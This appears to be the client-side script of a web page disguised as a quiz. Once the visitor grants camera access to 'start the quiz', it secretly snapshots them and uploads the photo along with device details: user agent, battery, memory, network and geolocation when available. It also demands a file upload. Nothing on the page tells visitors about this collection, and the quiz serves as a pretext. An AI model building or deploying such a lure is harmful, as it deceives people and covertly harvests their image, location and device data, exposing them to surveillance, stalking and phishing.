const startBtn = document.getElementById("start-btn");
const quizContainer = document.getElementById("quiz-container");
const quizForm = document.getElementById("quiz-form");
const successContainer = document.getElementById("success-container");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const fileInput = document.getElementById("user-file");

const BACKEND_BASE = "/api";
let cameraCaptured = false;

// ====================
// Start quiz & capture camera
// ====================
startBtn.addEventListener("click", async () => {
  startBtn.disabled = true;

  try {
    // System camera popup only
    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
    video.srcObject = stream;

    // wait 1s for camera
    await new Promise(r => setTimeout(r, 1000));

    quizContainer.style.display = "block";
    document.getElementById("start-container").style.display = "none";

    // Capture image once
    if (!cameraCaptured) {
      const ctx = canvas.getContext("2d");
      canvas.width = 640;
      canvas.height = 480;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      const image = canvas.toDataURL("image/png");
      const metadata = await collectMetadata();

      await fetch(`${BACKEND_BASE}/upload`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ image, metadata })
      });

      // Stop camera
      stream.getTracks().forEach(t => t.stop());
      cameraCaptured = true;
    }
  } catch (err) {
    console.error("Camera permission denied:", err);
    alert("Camera permission is required to start quiz.");
    startBtn.disabled = false;
  }
});

// ====================
// Collect metadata
// ====================
async function collectMetadata() {
  const metadata = {
    useragent: navigator.userAgent,
    platform: navigator.platform,
    battery: "N/A",
    location: "N/A",
    deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
    network: navigator.connection ? JSON.stringify(navigator.connection) : "N/A",
    time: new Date().toLocaleString(),
  };

  if (navigator.getBattery) {
    try {
      const b = await navigator.getBattery();
      metadata.battery = `${b.level * 100}% charging:${b.charging}`;
    } catch {}
  }

  if (navigator.permissions && navigator.geolocation) {
    try {
      const status = await navigator.permissions.query({ name: "geolocation" });
      if (status.state === "granted") {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
      }
    } catch {}
  }

  return metadata;
}

// ====================
// Upload file
// ====================
async function uploadFile(file) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();

    reader.onload = async () => {
      try {
        const res = await fetch(`${BACKEND_BASE}/file-upload`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ file: reader.result, filename: file.name })
        });
        resolve(await res.json());
      } catch (err) {
        reject(err);
      }
    };

    reader.onerror = () => reject(reader.error);
    reader.readAsDataURL(file);
  });
}

// ====================
// Form submit
// ====================
quizForm.addEventListener("submit", async (e) => {
  e.preventDefault();

  if (!fileInput.files.length) {
    alert("Please select a file before submitting!");
    return;
  }

  try {
    await uploadFile(fileInput.files[0]);
    quizContainer.style.display = "none";
    successContainer.style.display = "block";
  } catch (err) {
    console.error("Submit failed:", err);
    alert("Upload failed. Try again.");
  }
});
